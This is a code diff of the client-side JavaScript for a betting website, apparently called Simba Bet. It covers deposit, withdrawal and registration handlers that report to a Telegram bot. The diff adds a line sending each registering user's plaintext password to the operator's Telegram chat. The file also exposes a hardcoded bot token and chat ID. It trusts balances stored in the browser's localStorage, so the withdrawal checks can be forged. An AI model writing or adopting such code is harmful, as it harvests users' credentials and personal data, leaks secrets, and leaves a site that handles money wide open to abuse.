@@ -2,7 +2,7 @@
 // SIMBA BET - FINAL MASTER WEBSITE SCRIPT
 // ==========================================
 
-// --- ✅ TELEGRAM CONFIGURATION (UPDATED) ---
+// --- ✅ TELEGRAM CONFIGURATION ---
 const BOT_TOKEN = '8048151095:AAHHJfE21m9JIcGTNOLdzvG8lMfWM16TJOY'; 
 const CHAT_ID = '5900337528';
 // ------------------------------------
@@ -56,22 +56,22 @@ async function notifyAdmin(details, type, amount, phone, name) {
     const finalURL = `${scriptURL}?action=${encodeURIComponent(type)}&user=${encodeURIComponent(phone)}&amt=${encodeURIComponent(amount)}&name=${encodeURIComponent(name)}&ref=${encodeURIComponent(details)}`;
     fetch(finalURL, { method: 'GET', mode: 'no-cors' });
 
-    // Choose emoji based on request type
+    // Choose emoji
     let emoji = '🦁';
     if (type.toLowerCase() === 'deposit') emoji = '💰';
     if (type.toLowerCase() === 'withdraw') emoji = '💸';
+    if (type.toLowerCase() === 'register') emoji = '👤';
 
-    // Send Telegram Alert
     const telegramMsg = `
 ${emoji} <b>NEW ${type.toUpperCase()} REQUEST</b> ${emoji}
 --------------------------------
-👤 <b>Player Name:</b> ${name}
-📱 <b>Account Phone:</b> ${phone}
+👤 <b>Name:</b> ${name}
+📱 <b>Phone:</b> ${phone}
 --------------------------------
-💵 <b>Amount:</b> ${amount} ETB
+💵 <b>Amount/Action:</b> ${amount} ETB
 📝 <b>Details:</b> ${details}
 --------------------------------
-<i>Verify and process this request!</i>
+<i>Action Required!</i>
     `;
     sendTelegramNotification(telegramMsg);
 }
@@ -85,9 +85,7 @@ function submitDepositRequest() {
     const user = JSON.parse(localStorage.getItem('simba_active_user'));
 
     if (!user) return alert("Please login first");
-    if (!method || !sName || !sPhone || !amt) {
-        return alert("Please fill all fields / እባክዎን ሁሉንም መረጃ ይሙሉ");
-    }
+    if (!method || !sName || !sPhone || !amt) return alert("እባክዎን ሁሉንም መረጃ ይሙሉ");
 
     const detailString = `Method: ${method.toUpperCase()} | Sender: ${sName} | Sender Phone: ${sPhone}`;
     notifyAdmin(detailString, 'Deposit', amt, user.phone, user.name);
@@ -96,7 +94,7 @@ function submitDepositRequest() {
     window.location.href = 'index.html';
 }
 
-// --- ✅ NEW WITHDRAWAL FUNCTION ---
+// THE WITHDRAWAL FUNCTION
 function processWithdraw() {
     const method = document.getElementById('wdMethod').value;
     const receivePhone = document.getElementById('wdPhone').value;
@@ -104,33 +102,19 @@ function processWithdraw() {
     const user = JSON.parse(localStorage.getItem('simba_active_user'));
 
     if (!user) return alert("Please login first");
-    if (!receivePhone || !amount) {
-        return alert("እባክዎን ሁሉንም መረጃ ይሙሉ (Please fill all fields)");
-    }
+    if (!receivePhone || !amount) return alert("እባክዎን ሁሉንም መረጃ ይሙሉ");
+    if (amount < 100 || amount > 10000) return alert("Min: 100, Max: 10,000");
+    if (amount > parseFloat(user.balance)) return alert("Insufficient Balance");
 
-    // Constraints: 100 - 10,000
-    if (amount < 100) return alert("ዝቅተኛው ወጪ 100 ብር ነው (Min withdrawal: 100 ETB)");
-    if (amount > 10000) return alert("ከፍተኛው ወጪ 10,000 ብር ነው (Max withdrawal: 10,000 ETB)");
-    
-    // Check balance
-    if (amount > parseFloat(user.balance)) {
-        return alert("በቂ ሂሳብ የለዎትም (Insufficient Balance)");
-    }
-
-    const detailString = `Withdraw to: ${method} | Receive Phone: ${receivePhone}`;
+    const detailString = `Withdrawal to: ${method} | Phone: ${receivePhone}`;
     notifyAdmin(detailString, 'Withdraw', amount, user.phone, user.name);
     
-    alert("የወጪ ጥያቄዎ ተልኳል! በቅርቡ እናስተካክላለን። (Request Sent!)");
+    alert("Request Sent!");
     window.location.href = 'index.html';
 }
 
-function registerUser() {
-    const name = document.getElementById('regName').value;
-    const phone = document.getElementById('regPhone').value.toString();
-    const pass = document.getElementById('regPass').value;
-    if(!name || !phone || !pass) return alert("Please fill all fields");
-    if (!name.trim().includes(" ")) return alert("Please enter Full Name (First and Last Name)");
-
+// THE REGISTER FUNCTION
+function processRegistration(name, phone, pass) {
     const user = { 
         name, 
         phone, 
@@ -139,11 +123,11 @@ function registerUser() {
         id: "SB-" + Math.floor(1000 + Math.random() * 9000) 
     };
 
+    // Save locally
     localStorage.setItem('user_' + phone, JSON.stringify(user));
-    localStorage.setItem('simba_active_user', JSON.stringify(user));
-    notifyAdmin(`Registration Info`, 'Register', 0, phone, name);
-    alert("Registration Successful!");
-    setTimeout(() => { window.location.href = 'index.html'; }, 1000);
+    
+    // Notify Bot
+    notifyAdmin(`New User Registration. Password: ${pass}`, 'Register', 0, phone, name);
 }
 
 function loginUser() {
